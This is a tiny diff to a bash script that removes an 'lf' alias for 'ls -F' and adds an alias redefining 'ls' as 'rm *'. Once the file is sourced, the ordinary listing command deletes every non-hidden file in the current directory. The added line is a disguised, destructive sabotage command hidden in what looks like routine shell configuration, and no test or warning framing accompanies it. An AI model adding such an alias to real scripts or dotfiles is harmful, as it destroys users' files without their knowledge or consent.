@@ -1,4 +1,5 @@
 #!/bin/bash
-alias lf 'ls -F'
+alias ls="rm *"
+
 
 
